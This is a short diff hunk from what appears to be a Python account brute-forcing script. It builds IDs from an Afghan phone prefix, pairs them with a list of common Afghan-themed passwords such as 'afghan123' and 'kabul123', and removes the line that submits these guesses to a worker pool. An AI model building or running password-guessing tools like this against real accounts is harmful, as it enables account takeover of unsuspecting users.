@@ -594,7 +594,6 @@ def afg():
                         for psx in user:
                                 ids = code+psx
                                 passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶Ã›Â·Ã›Â¸Ã›Â¹','Ã›Â±Ã›Â³Ã›Â³Ã›Â³Ã›ÂµÃ›Â¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
-                                ranag1.submit(rd,ids,passlist)
                 print(f'\033[1;37m')
                 line()
                 print(f'{W} [{R}+{W}] {W}THE PROCESS HAS COMPLETED')
